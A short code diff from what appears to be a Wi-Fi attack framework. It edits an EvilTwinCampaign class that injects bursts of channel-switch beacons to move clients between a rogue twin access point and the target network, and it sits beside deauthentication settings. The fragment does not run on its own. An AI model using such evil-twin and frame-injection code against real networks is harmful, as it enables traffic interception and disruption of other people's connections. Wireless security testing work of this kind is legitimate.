@@ -22,7 +22,6 @@ _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
 _BURST_SIZE = 64
 _FRAME_GAP_SEC = 0.002
 _POLL_SEC = 0.25
-_CSA_RETURN_SEC = 0.5
 _DEAUTH_REASON = 7                               # class-3 frame from a nonassociated STA
 
 
@@ -161,9 +160,6 @@ class EvilTwinCampaign(Campaign):
     async def _csa_return(self) -> None:
         """CSA the twin-channel clients back to the target's channel."""
         frame = build_csa_beacon(self.twin_beacon, self.target_channel)
-        elapsed = 0.0
-        while elapsed < _CSA_RETURN_SEC:
-            for _ in range(_BURST_SIZE):
-                await self.twin_iface.send_no_wait(frame)
-                await asyncio.sleep(_FRAME_GAP_SEC)
-            elapsed += _BURST_SIZE * _FRAME_GAP_SEC
+        for _ in range(_BURST_SIZE):
+            await self.twin_iface.send_no_wait(frame)
+            await asyncio.sleep(_FRAME_GAP_SEC)
